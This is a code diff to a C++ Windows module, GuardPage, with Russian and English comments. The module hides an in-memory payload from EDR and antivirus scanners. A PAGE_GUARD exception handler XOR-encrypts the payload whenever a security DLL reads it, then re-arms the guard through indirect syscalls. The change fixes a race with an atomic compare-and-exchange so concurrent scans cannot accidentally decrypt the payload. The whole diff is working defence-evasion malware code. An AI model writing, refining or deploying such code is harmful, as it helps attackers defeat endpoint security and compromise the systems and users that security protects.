@@ -12,6 +12,7 @@
 #include "ApiResolver.h"
 #include "Syscall.h"
 #include <intrin.h>
+#include <winnt.h>
 
 namespace GuardPage
 {
@@ -20,7 +21,7 @@ namespace GuardPage
     static size_t gPayloadSize      = 0;
     static unsigned char* gXorKey   = nullptr;
     static size_t gKeyLen           = 0;
-    static bool   gIsEncrypted      = false;   // true после XOR-перешифрации
+    static volatile LONG gIsEncrypted = 0;   // 1 = зашифрован (после XOR-перешифрации)
     static BYTE*  gOurImageBase     = nullptr; // базовый адрес нашего модуля
     static size_t gOurImageSize     = 0;       // размер нашего модуля
 
@@ -60,7 +61,6 @@ namespace GuardPage
         BYTE* base = (BYTE*)gPayloadBase;
         for (size_t i = 0; i < gPayloadSize; i++)
             base[i] ^= gXorKey[i % gKeyLen];
-        gIsEncrypted = !gIsEncrypted;
     }
 
     // ═══ Переустановка PAGE_GUARD ═══
@@ -119,9 +119,13 @@ namespace GuardPage
                 return EXCEPTION_CONTINUE_EXECUTION;
 
             // EDR/AV DLL сканирует наш payload — XOR перешифровка
-            // Если уже зашифрован — не XOR повторно (это расшифрует!)
-            if (!gIsEncrypted)
+            // CAS: atomically check-and-set — only one thread wins the race.
+            // If two guard page violations fire concurrently, only the first
+            // transitions gIsEncrypted 0→1; the second sees 1 and skips,
+            // preventing double-XOR (which would decrypt the payload).
+            if (InterlockedCompareExchange(&gIsEncrypted, 1, 0) == 0)
             {
+                // We won the race — we are the one to encrypt
                 XorPayload();  // payload теперь зашифрован
 
                 // Re-arm PAGE_GUARD через indirect syscall — безопасен из VEH:
@@ -146,7 +150,7 @@ namespace GuardPage
         gPayloadSize  = payloadSize;
         gXorKey       = xorKey;
         gKeyLen       = keyLen;
-        gIsEncrypted  = false;
+        InterlockedExchange(&gIsEncrypted, 0);
 
         // Определяем диапазон нашего модуля для RIP-проверки
         DetectOurModule();
@@ -173,7 +177,7 @@ namespace GuardPage
         if (gPayloadBase)
         {
             // Если payload был перешифрован сканером — расшифровываем
-            if (gIsEncrypted)
+            if (InterlockedCompareExchange(&gIsEncrypted, 0, 0) != 0)
             {
                 XorPayload();  // XOR повторно = расшифровка
             }
@@ -196,7 +200,7 @@ namespace GuardPage
         gPayloadSize    = 0;
         gXorKey         = nullptr;
         gKeyLen         = 0;
-        gIsEncrypted    = false;
+        InterlockedExchange(&gIsEncrypted, 0);
         gOurImageBase   = nullptr;
         gOurImageSize   = 0;
     }
